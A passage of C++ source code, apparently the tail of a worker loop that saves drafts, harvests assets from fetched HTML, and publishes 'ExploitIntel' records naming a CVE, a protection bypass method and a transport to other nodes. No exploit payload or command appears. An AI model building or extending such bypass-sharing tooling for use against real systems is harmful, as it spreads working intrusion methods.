            if (naanHist_.size() > 25) naanHist_.erase(naanHist_.begin());

            persistDraft(d, hash);
            naanState_ = "active";

            if (!br.cveId.empty() && !html.empty()) {
                ExploitIntel intel;
                intel.cveId = br.cveId;
                intel.protectionType = br.protectionType;
                intel.bypassMethod = br.bypassMethod;
                intel.transport = br.transport;
                intel.confidence = 0.85;
                intel.discoveredBy = sha256Hex(nodeId_);
                intel.timestamp = nowMillis();
                intel.successCount = 1;
                intel.failCount = 0;
                intel.signature = sha256Hex(br.cveId + br.bypassMethod +
                    std::to_string(intel.timestamp));
                publishExploit(intel);
            }
        }

        if (!html.empty()) {
            auto harvest = extractAssets(html, url);
            NaanDraft hd{chosenTitle, topic, status, accepted ? ngt : 0.0};
            persistHarvest(hd, hash, harvest);
        }

        for (int w = 0; w < tickSec && !naanStop_.load(); w++) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }

    std::lock_guard<std::mutex> lock(mtx_);
    naanState_ = "off";
    naanRunning_.store(false);
}

}
}
